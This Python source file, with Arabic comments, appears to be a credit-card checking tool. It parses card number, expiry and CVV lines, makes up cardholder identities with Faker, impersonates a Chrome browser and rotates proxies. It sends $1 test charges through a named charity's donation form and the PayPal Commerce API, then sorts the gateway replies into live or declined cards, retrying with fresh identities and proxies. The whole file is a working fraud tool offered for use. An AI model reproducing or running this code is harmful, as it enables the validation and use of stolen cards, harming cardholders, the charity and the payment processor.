import re
import json
import base64
import secrets
import uuid
from faker import Faker
from curl_cffi.requests import AsyncSession
from proxy_manager import get_next_proxy   # استيراد الدالة المطلوبة

fake = Faker("en_UK")

class tools:
    @staticmethod
    def getcard(card: str) -> dict:
        parts = card.split("|")
        cc = parts[0].strip() if len(parts) > 0 else ""
        mm = parts[1].strip() if len(parts) > 1 else ""
        yy = parts[2].strip() if len(parts) > 2 else ""
        cvv = parts[3].strip() if len(parts) > 3 else ""
        
        mm = mm.zfill(2)
        
        if len(yy) == 4:
            yy = yy[-2:]
        elif len(yy) == 2:
            yy = yy
            
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}


    @staticmethod
    def find_between(s: str, first: str, last: str) -> str | None:
        try:
            return s.split(first, 1)[1].split(last, 1)[0]
        except (IndexError, AttributeError):
            return None

    @staticmethod
    def userdata() -> dict:
        fn = fake.first_name()
        ln = fake.last_name()
        return {
            "name": f"{fn} {ln}",
            "first": fn,
            "last": ln,
            "address": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip": fake.postcode(),
            "email": f"{fn.lower()}.{ln.lower()}@gmail.com",
            "phone": fake.phone_number(),
        }

    @staticmethod
    def get_card_type(cc_first: str) -> str:
        if not cc_first:
            return "visa"
        return {"3": "american-express", "5": "master-card", "6": "discover"}.get(cc_first[0], "visa")

RESPONSE_MAP = {
    "true": ("Success", "Charged - $1 ! ✅", True),
    "sucsess": ("Success", "Charged - $1 ! ✅", True),
    "do_not_honor": ("Declined", "Do Not Honor ❌", False),
    "account_closed": ("Declined", "Account Closed ❌", False),
    "payer_account_locked_or_closed": ("Declined", "Payer Account Locked Or Closed ❌", False),
    "lost_or_stolen": ("Declined", "Lost Or Stolen ❌", False),
    "cvv2_failure": ("Declined", "CVV2_FAILURE ❌", False),
    "suspected_fraud": ("Declined", "Suspected Fraud ❌", False),
    "invalid_account": ("Declined", "Invalid Account ❌", False),
    "reattempt_not_permitted": ("Declined", "Reattempt Not Permitted ❌", False),
    "account_blocked_by_issuer": ("Declined", "Account Blocked By Issuer ❌", False),
    "order_not_approved": ("Declined", "Order Not Approved ❌", False),
    "pickup_card_special_conditions": ("Declined", "Pick Card Special Conditions ❌", False),
    "payer_cannot_pay": ("Declined", "Payer Cannot Pay ❌", False),
    "insufficient_funds": ("Declined", "Insufficient Funds ❌", False),
    "generic_decline": ("Declined", "Generic Decline ❌", False),
    "compliance_violation": ("Declined", "Compliance Violation ❌", False),
    "transaction_not_permitted": ("Declined", "Transaction Not Permitted ❌", False),
    "payment_denied": ("Declined", "Payment Denied ❌", False),
    "invalid_transaction": ("Declined", "Invalid Transaction ❌", False),
    "restricted_or_inactive_account": ("Declined", "Restricted Or Inactive Account ❌", False),
    "security_violation": ("Declined", "Security Violation ❌", False),
    "declined_due_to_updated_account": ("Declined", "Declined Due To Updated Account ❌", False),
    "invalid_or_restricted_card": ("Declined", "Invalid Or Restricted Card ❌", False),
    "expired_card": ("Declined", "Expired Card ❌", False),
    "cryptographic_failure": ("Declined", "CRYPTOGRAPHIC_FAILURE ❌", False),
    "transaction_cannot_be_completed": ("Declined", "TRANSACTION_CANNOT_BE_COMPLETED ❌", False),
    "declined_please_retry": ("Declined", "DECLINED_PLEASE_RETRY_LATER ❌", False),
    "tx_attempts_exceed_limit": ("Declined", "TX_ATTEMPTS_EXCEED_LIMIT ❌", False),
}

class Gateway:
    @staticmethod
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
        token = secrets.token_hex(16)

        async with AsyncSession(impersonate="chrome139", proxies=proxies) as session:
            try:
                # Step 1: GET donation page
                headers_init = {
                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
                }
                resp_init = await session.get(
                    "https://bukjeh.org/donations/donation-2023-2-3/",
                    headers=headers_init,
                )
                html = resp_init.text
                hash_val = tools.find_between(html, 'name="give-form-hash" value="', '"')
                pre = tools.find_between(html, 'name="give-form-id-prefix" value="', '"')
                give = tools.find_between(html, 'name="give-form-id" value="', '"')
                if not hash_val or not pre or not give:
                    return "Error", "Missing form parameters", False

                enc_match = re.search(r'"data-client-token":"(.*?)"', html)
                if not enc_match:
                    return "Error", "data-client-token not found", False
                enc = enc_match.group(1)
                dec = base64.b64decode(enc).decode("utf-8")
                au_match = re.search(r'"accessToken":"(.*?)"', dec)
                if not au_match:
                    return "Error", "accessToken not found", False
                au = au_match.group(1)

                # Step 2: First AJAX - give_process_donation
                headers_ajax1 = {
                    "origin": "https://bukjeh.org",
                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "x-requested-with": "XMLHttpRequest",
                }
                data_ajax1 = {
                    "give-fee-amount": "0",
                    "give-fee-mode-enable": "false",
                    "give-fee-status": "enabled",
                    "give-honeypot": "",
                    "give-form-id-prefix": pre,
                    "give-form-id": give,
                    "give-form-title": "Help us make A'amar",
                    "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "give-form-minimum": "1.00",
                    "give-form-maximum": "999999.99",
                    "give-form-hash": hash_val,
                    "give-price-id": "3",
                    "give-recurring-logged-in-only": "",
                    "give-logged-in-only": "1",
                    "_give_is_donation_recurring": "0",
                    "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
                    "give-amount": "1.00",
                    "give-recurring-period-donors-choice": "month",
                    "payment-mode": "paypal-commerce",
                    "give_first": user_data["first"],
                    "give_last": user_data["last"],
                    "give_email": user_data["email"],
                    "card_name": user_data["name"],
                    "card_exp_month": "",
                    "card_exp_year": "",
                    "give_action": "purchase",
                    "give-gateway": "paypal-commerce",
                    "action": "give_process_donation",
                    "give_ajax": "true",
                }
                await session.post(
                    "https://bukjeh.org/wp-admin/admin-ajax.php",
                    headers=headers_ajax1,
                    data=data_ajax1,
                )

                # Step 3: Second AJAX - create order
                headers_ajax2 = {
                    "origin": "https://bukjeh.org",
                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                }
                params_ajax2 = {
                    "action": "give_paypal_commerce_create_order",
                }
                data_ajax2 = {
                    "give-fee-amount": "0",
                    "give-fee-mode-enable": "false",
                    "give-fee-status": "enabled",
                    "give-honeypot": "",
                    "give-form-id-prefix": pre,
                    "give-form-id": give,
                    "give-form-title": "Help us make A'amar",
                    "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "give-form-minimum": "1.00",
                    "give-form-maximum": "999999.99",
                    "give-form-hash": hash_val,
                    "give-price-id": "3",
                    "give-recurring-logged-in-only": "",
                    "give-logged-in-only": "1",
                    "_give_is_donation_recurring": "0",
                    "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
                    "give-amount": "1.00",
                    "give-recurring-period-donors-choice": "month",
                    "give_stripe_payment_method": "",
                    "payment-mode": "paypal-commerce",
                    "give_first": user_data["first"],
                    "give_last": user_data["last"],
                    "give_email": user_data["email"],
                    "card_name": user_data["name"],
                    "card_exp_month": "",
                    "card_exp_year": "",
                    "give-gateway": "paypal-commerce",
                }
                resp_ajax2 = await session.post(
                    "https://bukjeh.org/wp-admin/admin-ajax.php",
                    params=params_ajax2,
                    headers=headers_ajax2,
                    data=data_ajax2,
                )
                ajax2_json = resp_ajax2.json()
                order_id = ajax2_json.get("data", {}).get("id")
                if not order_id:
                    return "Error", "Failed to create PayPal order", False

                # Step 4: Confirm payment source via PayPal
                headers_paypal = {
                    "authorization": f"Bearer {au}",
                    "origin": "https://assets.braintreegateway.com",
                    "referer": "https://assets.braintreegateway.com/",
                    "content-type": "application/json",
                    "paypal-client-metadata-id": token,
                }
                json_paypal = {
                    "payment_source": {
                        "card": {
                            "number": card_data["cc"],
                            "expiry": f"20{card_data['yy']}-{card_data['mm']}",
                            "security_code": card_data["cvv"],
                            "attributes": {
                                "verification": {
                                    "method": "SCA_WHEN_REQUIRED",
                                },
                            },
                        },
                    },
                    "application_context": {
                        "vault": False,
                    },
                }
                resp_paypal = await session.post(
                    f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
                    headers=headers_paypal,
                    json=json_paypal,
                )
                paypal_text = resp_paypal.text.lower()

                # Step 5: Third AJAX - approve order
                headers_ajax3 = {
                    "origin": "https://bukjeh.org",
                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                }
                params_ajax3 = {
                    "action": "give_paypal_commerce_approve_order",
                    "order": order_id,
                }
                data_ajax3 = {
                    "give-fee-amount": "0",
                    "give-fee-mode-enable": "false",
                    "give-fee-status": "enabled",
                    "give-honeypot": "",
                    "give-form-id-prefix": pre,
                    "give-form-id": give,
                    "give-form-title": "Help us make A'amar",
                    "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "give-form-minimum": "1.00",
                    "give-form-maximum": "999999.99",
                    "give-form-hash": hash_val,
                    "give-price-id": "3",
                    "give-recurring-logged-in-only": "",
                    "give-logged-in-only": "1",
                    "_give_is_donation_recurring": "0",
                    "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
                    "give-amount": "1.00",
                    "give-recurring-period-donors-choice": "month",
                    "give_stripe_payment_method": "",
                    "payment-mode": "paypal-commerce",
                    "give_first": user_data["first"],
                    "give_last": user_data["last"],
                    "give_email": user_data["email"],
                    "card_name": user_data["name"],
                    "card_exp_month": "",
                    "card_exp_year": "",
                    "give-gateway": "paypal-commerce",
                }
                resp_ajax3 = await session.post(
                    "https://bukjeh.org/wp-admin/admin-ajax.php",
                    params=params_ajax3,
                    headers=headers_ajax3,
                    data=data_ajax3,
                )
                approve_text = resp_ajax3.text.lower()

                # Combine both responses for classification
                combined = paypal_text + " " + approve_text

                for key, (status, msg, is_live) in RESPONSE_MAP.items():
                    if key in combined:
                        return status, msg, is_live

                # Fallback: try JSON error extraction
                try:
                    error_data = resp_ajax3.json()
                    if 'data' in error_data and 'error' in error_data['data']:
                        err_msg = error_data['data']['error']
                        return "Declined", f"{err_msg} ❌", False
                except:
                    pass

                return "Unknown", "Unrecognised response ❓", False

            except Exception as e:
                return "Error", f"Exception: {str(e)}", False


async def process_paypal_1(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
    """
    معالجة الدفع مع نظام إعادة محاولة (Retry) عند الحصول على "Order Not Approved".
    - الحد الأقصى للمحاولات: 5.
    - كل محاولة تستخدم بيانات مستخدم جديدة وبروكسي جديد (يتم جلبه من get_next_proxy).
    - أي رد آخر غير "Order Not Approved" ينهي المحاولات فوراً ويعيد النتيجة.
    - إذا استمرت جميع المحاولات الخمس بـ "Order Not Approved"، يتم إرجاع النتيجة النهائية.
    """
    card_data = tools.getcard(card_line)
    if not card_data["cc"]:
        return "Failed", "Invalid card format", False

    max_attempts = 5
    last_result = None

    for attempt in range(max_attempts):
        # 1. بيانات مستخدم جديدة
        user_data = tools.userdata()

        # 2. بروكسي جديد من proxy_manager
        proxy_url_new = get_next_proxy()  # قد ترجع None
        proxies = {"http": proxy_url_new, "https": proxy_url_new} if proxy_url_new else None

        # 3. تنفيذ عملية الدفع
        status, msg, is_live = await Gateway.charge_card(
            card_data=card_data,
            user_data=user_data,
            proxies=proxies,
        )

        # 4. التحقق من النتيجة
        if "Order Not Approved" in msg:
            # هذه الحالة فشل، نستمر في المحاولات ما لم تكن الأخيرة
            if attempt == max_attempts - 1:
                # المحاولة الأخيرة أيضاً فشلت، نعيد هذه النتيجة
                return status, msg, is_live
            # خلاف ذلك، نواصل الحلقة
            continue
        else:
            # أي رد آخر (نجاح أو فشل مختلف) نعتبره نهائياً ونوقفه
            return status, msg, is_live

    # في حال خرجت الحلقة دون return (لن يحدث) نعيد افتراضي
    return "Error", "Max attempts exceeded unexpectedly", False